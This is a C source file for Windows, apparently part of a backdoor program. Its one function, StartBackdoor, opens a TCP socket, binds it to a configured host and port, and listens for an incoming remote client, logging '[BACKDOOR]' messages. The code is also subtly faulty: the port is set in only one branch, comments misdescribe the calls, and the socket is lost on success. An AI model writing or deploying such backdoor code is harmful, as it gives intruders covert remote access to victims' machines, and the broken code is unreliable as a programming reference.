#include "../include/config.h"

BOOL StartBackdoor(void) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in address;
    int opt = 1;
    BOOL success = FALSE;

    if (s == INVALID_SOCKET) {
        printf("[BACKDOOR] Failed to create socket.\n");
        return FALSE;
    }

    // Set to non-blocking mode
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(int));

    address.sin_family = AF_INET;
    
    // Use inet_pton for Wide/Unicode strings or inet_addr with char*
    if (inet_pton(AF_INET, BACKDOOR_HOST, &address.sin_addr) == 1) {
        address.sin_port = htons(BACKDOOR_PORT);
    } else {
        // Fallback to inet_addr (older, simpler)
        address.sin_addr.s_addr = inet_addr(BACKDOOR_HOST);
    }

    if (bind(s, (struct sockaddr*)&address, sizeof(address)) != SOCKET_ERROR) {
        if (listen(s, SOCKET_BACKLOG) != SOCKET_ERROR) {
            // Use inet_ntoa for Wide String compatibility
            char hostip[16];
            inet_ntop(AF_INET, &address.sin_addr, hostip, sizeof(hostip) - 1);
            printf("[BACKDOOR] Listener ready on %s:%d\n", hostip, BACKDOOR_PORT);
            printf("[BACKDOOR] Waiting for client...\n");
            return TRUE;
        }
    }

    printf("[BACKDOOR] Failed to bind/listen.\n");
    closesocket(s);
    return FALSE;
}
